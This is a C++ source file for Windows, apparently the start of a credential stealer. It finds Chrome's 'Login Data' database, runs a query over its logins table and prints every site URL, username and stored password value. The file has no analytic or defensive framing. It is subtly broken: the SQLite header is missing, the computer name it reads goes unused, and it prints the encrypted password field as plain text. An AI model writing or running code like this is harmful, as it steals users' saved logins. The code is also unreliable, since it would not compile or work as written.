#include <iostream>
#include <windows.h>
#include <ShlObj.h>
#include <string>
#include <sstream>

std::wstring GetChromePasswordDatabasePath() {
    PWSTR localAppDataPath;
    if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, NULL, &localAppDataPath))) {
        std::wstringstream ss;
        ss << localAppDataPath << L"\\Google\\Chrome\\User Data\\Default\\Login Data";
        CoTaskMemFree(localAppDataPath);
        return ss.str();
    }
    return L"";
}

int main() {
    // Get the computer name
    TCHAR computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
    if (!GetComputerName(computerName, &size)) {
        std::cerr << "Failed to get computer name. Error code: " << GetLastError() << std::endl;
        return 1;
    }

    // Get the Chrome password database path
    std::wstring chromeDBPath = GetChromePasswordDatabasePath();
    if (chromeDBPath.empty()) {
        std::cerr << "Failed to get Chrome password database path." << std::endl;
        return 1;
    }

    // Open the Chrome password database
    sqlite3* db;
    int rc = sqlite3_open16(chromeDBPath.c_str(), &db);
    if (rc != SQLITE_OK) {
        std::cerr << "Failed to open the Chrome password database. Error code: " << rc << std::endl;
        return 1;
    }

    // Prepare the SQL query to retrieve passwords
    const char* query = "SELECT origin_url, username_value, password_value FROM logins";
    sqlite3_stmt* stmt;
    rc = sqlite3_prepare_v2(db, query, -1, &stmt, nullptr);
    if (rc != SQLITE_OK) {
        std::cerr << "Failed to prepare the SQL query. Error code: " << rc << std::endl;
        sqlite3_close(db);
        return 1;
    }

    // Execute the SQL query and retrieve passwords
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        const unsigned char* url = sqlite3_column_text(stmt, 0);
        const unsigned char* username = sqlite3_column_text(stmt, 1);
        const unsigned char* password = sqlite3_column_text(stmt, 2);

        std::cout << "URL: " << url << std::endl;
        std::cout << "Username: " << username << std::endl;
        std::cout << "Password: " << password << std::endl;
        std::cout << std::endl;
    }

    // Finalize the SQL statement and close the database
    sqlite3_finalize(stmt);
    sqlite3_close(db);

    return 0;
}
